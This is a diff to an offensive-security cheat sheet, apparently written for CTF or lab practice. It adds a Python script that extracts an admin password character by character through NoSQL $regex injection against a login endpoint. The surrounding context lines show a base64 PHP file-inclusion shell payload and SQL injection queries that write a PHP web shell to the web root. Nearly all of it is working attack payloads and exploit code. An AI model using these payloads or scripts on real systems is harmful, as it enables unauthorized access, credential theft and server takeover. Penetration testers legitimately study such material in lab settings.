@@ -996,6 +996,46 @@ http://www.test.com.ar/main.php?pagina=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7
 | `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
 | `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
 
+# Nosql
+
+### Grab password with JSON post request
+```
+import json
+import requests
+import string
+import sys
+
+url = 'http://10.10.11.139:5000/login'
+def login(pw):
+	payload = '{ "$regex": "%s" }' % pw
+	data = { "user": "admin","password":json.loads(payload) }
+	r = requests.post(url,json=data)
+	if 'Invalid Password' in r.text:
+		return False
+	return True
+
+password = '^'
+stop = False
+while stop == False:
+	for i in string.ascii_letters:
+		sys.stdout.write(f'\r{password}{i}')
+		if login(f'{password}{i}'):
+			password += i
+			if login(f"{password}$"):
+				sys.stdout.write(f'\r{password}\r\n')
+				sys.stdout.flush()
+				stop = True
+				break
+			break
+```
+
+
+
+
+
+
+
+
 # Windows
 ----------------------------------------------------------------------------------------------------------
 ## Basic enumeration on linux and windows
